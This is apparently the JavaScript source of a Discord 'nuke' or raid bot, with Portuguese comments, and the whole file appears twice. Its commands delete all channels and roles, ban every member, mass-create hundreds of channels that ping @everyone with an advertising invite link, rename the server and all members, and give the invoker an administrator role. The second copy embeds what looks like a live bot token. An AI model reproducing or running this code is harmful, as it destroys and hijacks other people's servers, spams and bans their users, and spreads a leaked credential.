const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');

client.on("ready", () => {
  console.log(chalk.red(` 
             ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗
             ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝
             ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░
             ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░
             ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░

     ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
     │                                                                        │
     │                .nuke = Destroi o servidor completamente                │
     │                   .delchannel = Apaga todos os chats                   │
     │                  .raid = Cria muitos canais com pings                  │
     │                  .admin = Criar um cargo com permissão total           │
     │                                                                        │
     │                  Use .help para ver todos os comandos                  │
     │                                                                        │
     │                                 BOT Online                             │
     ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
  presencia();
});

function presencia() {
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: "muitas coisas...",
      type: "STREAMING"
    }
  });
}


// === COMANDO NUKE ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.nuke') {
    message.delete();
    message.guild.channels.cache.forEach(channel => channel.delete());
    
    message.guild.channels.create(`stumble-league`, { type: 'text' }).then(channel => {
      channel.send("@everyone");
      channel.send("STUMBLE LEAGUE PASSOU AQUI:");
      channel.send("https://discord.gg/Fu9hWfyAec");
    });

    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`stumble-league-passou`, { type: 'text' }).then(channel => {
        channel.send("@everyone");
        channel.send("STUMBLE LEAGUE PASSOU AQUI:");
        channel.send("https://discord.gg/Fu9hWfyAec");
      });
    }

    message.guild.setName("STUMBLE LEAGUE PASSOU AQUI");
  }
});


// === COMANDO BANALL ===
client.on("message", async message => {
  if(message.content.startsWith('.banall')){
    message.delete();
    message.guild.members.cache.forEach(member => {
      if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
        member.ban();
      }
    });
  }
});


// === COMANDO DELCHANNEL ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.delchannel') {
    message.delete();
    message.guild.channels.cache.forEach(channel => channel.delete());
    
    message.guild.channels.create(`STUMBLE-LEAGUE`, { type: 'text' }).then(channel => {
      channel.send("@everyone");
      channel.send("STUMBLE LEAGUE PASSOU AQUI:");
      channel.send("https://discord.gg/Fu9hWfyAec");
    });
  }
});


// === COMANDO RAID ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.raid') {
    message.delete();
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(` ̷s̷t̷u̷m̷b̷l̷e̷-̷l̷e̷a̷g̷u̷e̷`, { type: 'text' }).then(channel => {
        channel.send("@everyone");
        channel.send("STUMBLE LEAGUE PASSOU AQUI:");
        channel.send("https://discord.gg/Fu9hWfyAec");
      });
    }
  }
});


// === COMANDO DELROLE ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.delrole') {
    message.delete();
    message.guild.roles.cache.map(roles => roles.delete());
  }
});


// === COMANDO CREATEROLE ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.createrole') {
    message.delete();
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `STUMBLE LEAGUE`, color: '#000' }, reason: 'razon' });
    }
  }
});


// === COMANDO NICKALL ===
client.on("message", msg => {
  const args = msg.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.nickall') {
    msg.delete();
    let nickname = args.join(" ");
    let total = 0;
    msg.guild.members.cache.forEach(() => total++);
    msg.channel.send("> Modificando o nome de **" + total + "** usuarios para: **" + nickname + "**");
    msg.guild.members.cache.forEach(member => member.setNickname(nickname));
  }
});


// === COMANDO ADMIN ===
client.on("message", async msg => {
  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('.admin')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: ".",
        color: "000",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    });
    msg.member.roles.add(rol);
  }
});


// ==============================================
// === COLOQUE SEU TOKEN AQUI, DENTRO DAS ASPAS ===
client.login("COLOQUE_SEU_TOKEN_AQUI");
// ==============================================
const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');

client.on("ready", () => {
  console.log(chalk.red(` 
             ██╗░░██╗██╗░██████╗████████╗░█████╗░██████╗░██╗░░░██╗
             ██║░░██║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝
             ███████║██║╚█████╗░░░░██║░░░██║░░██║██████╔╝░╚████╔╝░
             ██╔══██║██║░╚═══██╗░░░██║░░░██║░░██║██╔══██╗░░╚██╔╝░░
             ██║░░██║██║██████╔╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░

     ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
     │                                                                        │
     │                .nuke = Destroi o servidor completamente                │
     │                   .delchannel = Apaga todos os chats                   │
     │                  .raid = Cria muitos canais com pings                  │
     │                  .admin = Criar um cargo com permissão total           │
     │                                                                        │
     │                  Use .help para ver todos os comandos                  │
     │                                                                        │
     │                                 BOT Online                             │
     ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
  presencia();
});

function presencia() {
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: "muitas coisas...",
      type: "STREAMING"
    }
  });
}


// === COMANDO NUKE ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.nuke') {
    message.delete();
    message.guild.channels.cache.forEach(channel => channel.delete());
    
    message.guild.channels.create(`stumble-league`, { type: 'text' }).then(channel => {
      channel.send("@everyone");
      channel.send("STUMBLE LEAGUE PASSOU AQUI:");
      channel.send("https://discord.gg/Fu9hWfyAec");
    });

    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`stumble-league-passou`, { type: 'text' }).then(channel => {
        channel.send("@everyone");
        channel.send("STUMBLE LEAGUE PASSOU AQUI:");
        channel.send("https://discord.gg/Fu9hWfyAec");
      });
    }

    message.guild.setName("STUMBLE LEAGUE PASSOU AQUI");
  }
});


// === COMANDO BANALL ===
client.on("message", async message => {
  if(message.content.startsWith('.banall')){
    message.delete();
    message.guild.members.cache.forEach(member => {
      if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
        member.ban();
      }
    });
  }
});


// === COMANDO DELCHANNEL ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.delchannel') {
    message.delete();
    message.guild.channels.cache.forEach(channel => channel.delete());
    
    message.guild.channels.create(`STUMBLE-LEAGUE`, { type: 'text' }).then(channel => {
      channel.send("@everyone");
      channel.send("STUMBLE LEAGUE PASSOU AQUI:");
      channel.send("https://discord.gg/Fu9hWfyAec");
    });
  }
});


// === COMANDO RAID ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.raid') {
    message.delete();
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(` ̷s̷t̷u̷m̷b̷l̷e̷-̷l̷e̷a̷g̷u̷e̷`, { type: 'text' }).then(channel => {
        channel.send("@everyone");
        channel.send("STUMBLE LEAGUE PASSOU AQUI:");
        channel.send("https://discord.gg/Fu9hWfyAec");
      });
    }
  }
});


// === COMANDO DELROLE ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.delrole') {
    message.delete();
    message.guild.roles.cache.map(roles => roles.delete());
  }
});


// === COMANDO CREATEROLE ===
client.on("message", message => {
  if (message.author.bot) return;
  if (message.content === '.createrole') {
    message.delete();
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `STUMBLE LEAGUE`, color: '#000' }, reason: 'razon' });
    }
  }
});


// === COMANDO NICKALL ===
client.on("message", msg => {
  const args = msg.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.nickall') {
    msg.delete();
    let nickname = args.join(" ");
    let total = 0;
    msg.guild.members.cache.forEach(() => total++);
    msg.channel.send("> Modificando o nome de **" + total + "** usuarios para: **" + nickname + "**");
    msg.guild.members.cache.forEach(member => member.setNickname(nickname));
  }
});


// === COMANDO ADMIN ===
client.on("message", async msg => {
  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('.admin')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: ".",
        color: "000",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    });
    msg.member.roles.add(rol);
  }
});


// ==============================================
// === COLOQUE SEU TOKEN AQUI, DENTRO DAS ASPAS ===
client.login("MTUyMzAzODMzMDU1NDY4MzYwNg.GrFO8B.fKzI6mlKz87wpfa_25BxDVsWa_EGYpDgtyjduQ");
// ==============================================
